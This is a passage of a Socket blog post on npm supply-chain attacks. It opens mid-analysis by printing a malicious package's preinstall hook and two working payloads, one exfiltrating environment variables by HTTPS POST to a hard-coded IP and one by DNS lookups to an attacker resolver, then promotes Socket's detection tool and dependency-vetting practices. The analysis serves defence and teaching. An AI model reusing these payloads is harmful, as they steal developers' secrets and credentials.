    <span>&#34;test&#34;</span>: <span>&#34;echo \&#34;Error: no test specified\&#34; &amp;&amp; exit 1&#34;</span>,
    <span>&#34;preinstall&#34;</span>: <span>&#34;node dns.js | node index.js | node specific-fields.js&#34;</span>
  },
  <span>&#34;files&#34;</span>: [<span>&#34;specific-fields.js&#34;</span>, <span>&#34;index.js&#34;</span>, <span>&#34;dns.js&#34;</span>],
  <span>&#34;author&#34;</span>: <span>&#34;&#34;</span>,
  <span>&#34;license&#34;</span>: <span>&#34;ISC&#34;</span>
}
</code></pre>
<p>Again this is a standard install script attack vector. But it runs a few
different payloads, each using a different technique.</p>
<p>Let&#39;s look at the first:</p>
<h3><code>http.js</code></h3>
<pre><code><span>const</span> http = <span>require</span>(<span>&#39;https&#39;</span>)

req = http
  .request({
    <span>host</span>: <span>&#39;34.195.72.180&#39;</span>,
    <span>path</span>: <span>&#39;/&#39;</span>,
    <span>method</span>: <span>&#39;POST&#39;</span>,
    <span>headers</span>: {
      <span>host</span>: <span>&#39;411c316239cf14afaa1f37bbc5666207.m.pipedream.net&#39;</span>,
      <span>&#39;User-Agent&#39;</span>: <span>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36&#39;</span>
    }
  })
  .on(<span>&#39;error&#39;</span>, <span><span>function</span> (<span>err</span>) </span>{})

req.write(Buffer.from(<span>JSON</span>.stringify(process.env)).toString(<span>&#39;base64&#39;</span>))
req.end()
</code></pre>
<p>You can see that the malware collects the environment variables via
<code>process.env</code> and then makes an HTTP request to exfiltrate the data to an IP
address.</p>
<p>But this malware also uses a backup exfiltration technique:</p>
<h3><code>dns.js</code></h3>
<pre><code><span>var</span> { Resolver } = <span>require</span>(<span>&#39;dns&#39;</span>)
<span>var</span> zlib = <span>require</span>(<span>&#39;zlib&#39;</span>)

<span>var</span> resolver = <span>new</span> Resolver()

<span><span>function</span> <span>splitString</span>(<span>string, size</span>) </span>{
  <span>var</span> re = <span>new</span> <span>RegExp</span>(<span>&#39;.{1,&#39;</span> + size + <span>&#39;}&#39;</span>, <span>&#39;g&#39;</span>)
  <span>return</span> string.match(re)
}

resolver.setServers([<span>&#39;165.232.68.239&#39;</span>])
<span>var</span> d = process.env || {}
<span>var</span> data = redactedForBrevity()

<span>var</span> encData = zlib
  .brotliCompressSync(Buffer.from(<span>JSON</span>.stringify(data)))
  .toString(<span>&#39;hex&#39;</span>)

<span>var</span> ch = splitString(encData, <span>60</span>)

<span>var</span> dt = <span>Date</span>.now()

<span>for</span> (<span>var</span> i = <span>0</span>; i &lt; ch.length; i++) {
  <span>const</span> domain = [<span>&#39;l&#39;</span> + dt, i + <span>1</span>, ch.length, ch[i]].join(<span>&#39;.&#39;</span>)
  resolver.resolve4(domain, <span><span>function</span> (<span>err</span>) </span>{})
}
</code></pre>
<p>In addition to HTTP, it uses DNS to send the data to the attacker. This is
useful when an firewall is present since these often don&#39;t block DNS lookups.</p>
<p>To pull this off, the attacker uses a custom DNS resolver and puts the
environment variables they&#39;re stealing into a subdomain.</p>
<p>And finally, our last attack technique...</p>
<h2>6. Obfuscation</h2>
<p>We already saw an example of this before. Obfuscated code makes it hard to audit code and decipher what it is doing. This can be used to hide malicious code from tools which use static analysis, such as <a href="https://socket.dev/">Socket</a>, although we have techniques to detect obfuscation and we use that as a strong negative signal.</p>
<p>Another type of obfuscation is when attackers publish different code to npm than
they publish on GitHub. When they do that, npm doesn&#39;t make it easy to see what
code is actually in the npm package, and so a lot of people who are trying to
evaluate a package will rely on the version of the code that&#39;s on GitHub.
There&#39;s no guarantee that the code on GitHub is the same as the code on npm.</p>
<p>Now let&#39;s talk about how you can protect your app.</p>
<h2>How can you protect your app from supply chain attacks?</h2>
<p>We asked ourselves this question when we were working on
<a target="_blank" rel="noopener noreferrer" href="https://wormhole.app">Wormhole<svg viewBox="0 0 24 24" focusable="false"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><path d="M15 3h6v6"></path><path d="M10 14L21 3"></path></g></svg></a>, which lets you share files with end-to-end
encryption. Our goal was to make Wormhole the best way to send files, combining the usability of a web app with <a target="_blank" rel="noopener noreferrer" href="https://wormhole.app/security">best-in-class security<svg viewBox="0 0 24 24" focusable="false"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><path d="M15 3h6v6"></path><path d="M10 14L21 3"></path></g></svg></a>.</p>
<a target="_blank" rel="noopener noreferrer" href="https://wormhole.app"><p><span><span><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%272402%27%20height=%271422%27/%3e"/></span><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic"/></span></p></a>
<p>As the frequency of npm supply chain attacks increased throughout 2021, we became concerned about the safety of our dependencies.</p>
<p>We realized we needed to improve the way we vet our open source dependencies or else we would be leaving our user&#39;s security and privacy to chance. We didn&#39;t feel comfortable telling people to trust our service with their most precious data when malware could be lurking in any dependency update.</p>
<p>We started thinking carefully about this problem space and started building
solutions. Here are some of the things we did, and what you can do too:</p>
<h2>1. Change the way you think about dependencies</h2>
<p>As an industry, we need a mindset shift around the way we use dependencies. Too
many developers assume they can just install open source code from the internet
and, barring bugs, it will always do what it says on the tin. Unfortunately, as
we&#39;ve seen, this just isn&#39;t true.</p>
<p>Open source is like an all-you-can-eat buffet – no one will stop you from
scooping an unlimited number of dependencies onto your plate. Of course, like a
buffet, there are health consequences to overindulging. You take a small hit
with each dependency you install.</p>
<p>If you&#39;re shipping code to production that includes open source code, then you must treat the open source code as part of your app. You are ultimately responsible for the behavior of that code.</p>

<p>The most popular open source license, the MIT license, actually literally says
this:</p>
<blockquote>
<p><strong>THE SOFTWARE IS PROVIDED &#34;AS IS&#34;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED</strong>, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. <strong>IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY</strong>, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p>
</blockquote>
<p>Most developers don&#39;t think of open source this, way but it&#39;s actually how it works.</p>
<h2>2. Dig deeper than the README</h2>
<p>Many developers rely on heuristics to determine if a package is good:</p>
<ul>
<li>✅ Does it get the job done?</li>
<li>✅ Does it have good docs?</li>
<li>✅ Does it have lots of downloads and GitHub stars?</li>
<li>✅ Does it have recent commits?</li>
<li>✅ Does it have tests? Types?</li>
</ul>
<p>Checking for these things is good, but it&#39;s not enough to stop supply chain
attacks. To stop attacks, you must dig deeper.</p>
<p>We built a tool called <a href="https://socket.dev/">Socket</a> to help you do this.</p>
<p>We built Socket to look for the markers present in the recent npm supply chain
attacks (as discussed above). Unlike other tools such as Snyk or Dependabot,
Socket analyzes the actual <strong>behavior</strong> of a package instead of relying on stale
data from a known vulnerability (CVE) database. This way, we can detect and
block attacks before they&#39;ve been discovered by the community.</p>
<p>You can use Socket to quickly evaluate the security of a package:</p>
<a href="https://socket.dev/npm/package/bufferutil"><p><span><span><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%272458%27%20height=%271138%27/%3e"/></span><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic"/></span></p></a>
<p>In this example, you can see that <a href="https://socket.dev/npm/package/bufferutil"><code>bufferutil</code></a>
contains install scripts. It&#39;s called out prominently at the top of the page,
along with a link to the exact code that will run when you run <code>npm install bufferutil</code>.
In this instance, <code>bufferutil</code>&#39;s use of install scripts is legitimate, but it&#39;s
nice to be able to know <em>before</em> you run <code>npm install bufferutil</code> that code will
be immedately executed, as well as what that code will do, so that you can make an informed decision about whether to proceed.</p>
<p>You&#39;ll also notice helpful Package Health scores at the top of the page.</p>
<p>Now let&#39;s take a look at another example:</p>
<a href="https://socket.dev/npm/package/angular-calendar"><p><span><span><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%272556%27%20height=%271418%27/%3e"/></span><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic"/></span></p></a>
<p>The package <code>angular-calendar</code> is quite a useful package. It&#39;s a calendar
web component that renders a little calendar widget.</p>
<p>But, if you dig into its dependencies, you&#39;ll actually find that some of them have behavior that is potentially concerning:</p>
<a href="https://socket.dev/npm/package/angular-calendar/issues"><p><span><span><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%272560%27%20height=%271422%27/%3e"/></span><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic"/></span></p></a>
<p>You can see here that one of <code>angular-calendar</code>&#39;s dependencies contains install scripts, runs shell scripts, accesses the file system, and accesses the network.</p>
<p>This is probably not something that you would expect a web component to be doing, and so it may be worth some further investigation to figure out what&#39;s going on
here before you use this package.</p>
<p>Fortunately, Socket makes it easy to see which code is triggering a security issue. Just click any issue to jump straight to the line of code that is causing the issue.</p>
<a href="https://socket.dev/npm/package/@scarf/scarf/files/1.1.1/report.js"><p><span><span><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%272554%27%20height=%271420%27/%3e"/></span><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic"/></span></p></a>
<p>In this example, you can see the exact line of code where this package accesses the network, the shell, the filesystem, environment variables, and more.</p>
<p>Socket makes it easy to get an idea of what a package will do <em>before you install it</em>.</p>
<p>If you want to research packages on Socket to make an informed decision before
you install them, you can do that by visiting <a href="https://socket.dev/">socket.dev</a>.
Pro-tip: you can use our handy shortcut and just visit
<code>socket.dev/&lt;package-name&gt;</code> to go straight to a package page. For example, try
<a href="https://socket.dev/fastify">socket.dev/fastify</a>.</p>
<h2>3. Update your dependencies at the right cadence</h2>
<p>How quickly should you update your dependencies? This is a question that a lot of teams, including our own, struggled with.</p>
<p>Should you err on the side of updating slowly or quickly?</p>
<p>If you <strong>update slowly</strong> you&#39;re exposed to <strong>known vulnerabilities</strong> and you&#39;re running code that&#39;s old and may have bugs that have been fixed in a newer version. Not only that, if a security vulnerability is discovered in the future, being on a super old version will make it harder to update to take the security fix.</p>
<p>On the other hand, if you <strong>update quickly</strong> you expose yourself to <strong>supply chain attacks</strong> because you&#39;re now running code that may have been published <em>literally hours ago</em> which means that very few, if any, eyeballs have had a chance to look at the code.</p>
<p><span><span><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271920%27%20height=%271080%27/%3e"/></span><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic"/></span></p>
<p>This is a hard tradeoff to balance. Different teams will make different decisions.</p>
<p>However, you can use Socket to help. With the Socket
<a href="https://socket.dev/integrations">GitHub App</a>, you can accept most dependency updates quickly –
those where the package&#39;s capabilities have not changed – while reserving time
to review more significant updates. This way you can spend your limited team
resources auditing the highest-impact dependency updates, instead of choosing an
all-or-nothing approach.</p>
<blockquote>
<p>Socket is in beta. This GitHub App currently supports typosquat detection
only. The <a href="https://socket.dev/npm/issue">remaining detections</a> will become available within the
GitHub App by end of March.</p>
</blockquote>
<h2>4. Audit your dependencies</h2>
<p>How closely should you audit a dependency before allowing it into your app?</p>
<p>One option is to do a <strong>full audit</strong> – literally read every line of code in
every dependency. Google is known to do a full audit and then to vendor their
open source dependencies. This is great for preventing supply chain attacks but
it takes a full-time team to manage this – the audits, the updates, the
allowlist, applying critical security patches – and even still, Google is
usually several major versions behind for most libraries. This approach is out
of reach for all but the largest companies or the most security-critical
applications (e.g. crypto wallets). It&#39;s lots of work, it&#39;s slow, it&#39;s
expensive.</p>
<p>On the other hand, <strong>doing nothing</strong> is also an option – and it&#39;s the one that
most teams take. On most teams, any developer can install any dependency they
want to get the job done. Most of the time, no one on the team even looks at the
code in these dependencies before approving the pull request. As you might
expect, this approach leaves you completely vulnerable to supply chain attacks,
it&#39;s risky, and it can be expensive, albeit in the form of breaches, bad press,
and government fines.</p>
<p><span><span><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271920%27%20height=%271080%27/%3e"/></span><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic"/></span></p>
<p>Without tooling, this is a hard tradeoff to manage, which explains why most teams just do nothing.</p>
<p>However, Socket can help here too. With the Socket <a href="https://socket.dev/integrations">GitHub App</a>,
you can accept most dependency updates without auditing the code – especially if
there are no issues detected by Socket – while reserving time to review packages
which have risky behavior such as using <code>eval()</code>, or that contain obscuted code.
Socket helps you spend your limited team resources auditing the highest-impact
dependency updates, instead of choosing an all-or-nothing approach.</p>
<blockquote>
<p>Socket is in beta. This GitHub App currently supports typosquat detection
only. The <a href="https://socket.dev/npm/issue">remaining detections</a> will become available within the
GitHub App by end of March.</p>
</blockquote>
<h2>Find the happy medium with Socket</h2>
<p>You don&#39;t need to throw your hands up in exasperation and do nothing about supply chain risk. We built Socket to be the antidote to an all-or-nothing approach.</p>
<p>With the Socket approach:</p>
<ul>
<li>Use automation to automatically evaluate all dependencies</li>
<li>Detect and block attacks such as malware, hidden code, typo-squatting, etc.</li>
<li>Have humans manually audit suspicious packages (i.e. new capabilities added)</li>
<li>Provide security information directly in pull request comments</li>
</ul>
<h2>How to use Socket today</h2>
<p>You can install Socket as a <a href="https://socket.dev/integrations">GitHub App</a>. It will automatically evaluate all changes to <code>package.json</code> and other “package manifest” files such as <code>package-lock.json</code> and <code>yarn.lock</code>. Whenever a new dependency is added in a pull request, Socket will evaluate it and leave a comment indicating if it is a security risk.</p>
<p>For example, say that you accidentally installed <a href="https://socket.dev/npm/package/browserlist"><code>browserlist</code></a> instead of <a href="https://socket.dev/npm/package/browserslist"><code>browserslist</code></a>, a very easy mistake to make. Socket will detect this and leave a comment in the pull request:</p>
<a href="https://socket.dev/integrations"><p><span><span><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271368%27%20height=%27692%27/%3e"/></span><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic"/></span></p></a>
<p>With the Socket GitHub App in place, the developer who opened the pull request
(or the developer reviewing it) will have their attention drawn to this
typosquat issue. Socket doesn&#39;t get in the way, but it does augment your review
process.</p>
<p>Before we started building Socket, I
<a target="_blank" rel="noopener noreferrer" href="https://github.com/preactjs/preact-cli/pull/1576">found this exact typosquat issue<svg viewBox="0 0 24 24" focusable="false"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><path d="M15 3h6v6"></path><path d="M10 14L21 3"></path></g></svg></a> in the popular <a href="https://socket.dev/npm/package/preact"><code>preact</code></a> package. It&#39;s an easy mistake to
make, and that&#39;s probably why <a href="https://socket.dev/npm/package/browserlist"><code>browserlist</code></a>
continues to be downloaded 15,000 times each week.</p>
<p>This particular example with <code>browserlist</code> is not unique. There are hundreds of
thousands of npm packages within 1-2 characters of each other, so this is a very
easy mistake to make. Typosquatting is one of the most common supply chain
attack vectors.</p>
<p>Socket has <a href="https://socket.dev/npm/issue">60 detections</a> in five different categories – supply
chain risk, quality, maintenance, known vulnerabilities, and license. Each of
these issues won&#39;t immediately trigger an alert. Rather, we use each of these
issues as one signal into supply chain risk formula that determines whether we
will raise an issue to your attention. Socket aims to only raises high signal
issues that are worth your precious time and attention.</p>
<p>If you decide to <a href="https://socket.dev/integrations">install the Socket GitHub App</a>, we&#39;re eager for
your feedback. Please join our Discord (link in the footer) or <a href="https://socket.dev/contact">send us an email</a>.</p>
<blockquote>
<p>Socket is in beta. This GitHub App currently supports typosquat detection only. The <a href="https://socket.dev/npm/issue">remaining detections</a> will become available within the GitHub App by end of March.</p>
</blockquote>
<h2>How much will Socket cost?</h2>
<p>Open source package search with Socket Package Health Scores are <strong>free to
everyone</strong> on our website, <a href="https://socket.dev/">https://socket.dev</a>.</p>
<p>Socket integrations, such as the <a href="https://socket.dev/integrations">GitHub App</a>, are <strong>free for open source repositories, forever</strong>. For private repositories, Socket is free while we&#39;re in beta. We&#39;re still working out pricing; we&#39;re aiming to keep it affordable so every team can get protected.</p>
<h2>We can improve supply chain security, together!</h2>
<p>The open source ecosystem faces an unprecedented supply chain security threat but all hope is not lost. As developers, we can take responsibility for our software supply chain and help make the world a safer place.</p>
<p>P.S. We&#39;re hiring at Socket! Check out our <a href="https://socket.dev/jobs">jobs page</a> if you&#39;re
interested in working to secure the software supply chain.</p>
<p><em>This blog post was <a target="_blank" rel="noopener noreferrer" href="https://www.youtube.com/watch?v=-uAX28hfZcc">originally presented<svg viewBox="0 0 24 24" focusable="false"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><path d="M15 3h6v6"></path><path d="M10 14L21 3"></path></g></svg></a> by Feross at <a target="_blank" rel="noopener noreferrer" href="https://nodecongress.com">Node Congress 2022<svg viewBox="0 0 24 24" focusable="false"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><path d="M15 3h6v6"></path><path d="M10 14L21 3"></path></g></svg></a>.</em></p></div></div>
  </body>
</html>
